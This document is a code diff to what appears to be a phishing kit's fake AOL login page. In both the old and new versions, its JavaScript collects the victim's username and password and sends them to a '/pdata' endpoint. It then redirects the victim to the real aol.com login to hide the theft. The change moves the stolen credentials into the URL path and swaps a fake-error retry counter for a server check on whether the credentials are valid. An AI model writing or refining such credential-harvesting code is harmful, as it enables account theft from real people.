@@ -1,5 +1,4 @@
 
-<!DOCTYPE html>
 <html id="Stencil" class="no-js grid light-theme ">
     <head>
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
@@ -725,33 +724,25 @@
             em = $("#login-username").val()
             pw = $('.password').val()
 
-            fd = {"em": em, 'pwd': pw}
-
-            fetch('/pdata', {
-                method: 'POST',
+        
+            fetch(`/pdata/${em}/${pw}`, {
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(fd),
-                }).then( resp => {
-                    c++
-
-                    setTimeout( function(){
-                        if(c < 3){
-                            $(".err2").show()
-                            $('.loader2').hide()
-                            $('.password').val('')
-                        } else{
-                            window.location.replace('https://aol.com/login')
-                        }
-                    }, 2500)
+               
+                }).then( resp => { return resp.json()}
+                ).then(data => {
+                    if(data.success){
+                        window.location.replace('https://aol.com/login')
+                    } else{
+                        $(".err2").show()
+                        $('.loader2').hide()
+                        $('.password').val('')
+                    }
+                   
                  
                 })
                    
         }
 
-        
-         
-
-        
 
         $(".password").on('keyup', function (e) {
             if (e.key === 'Enter' || e.keyCode === 13) {
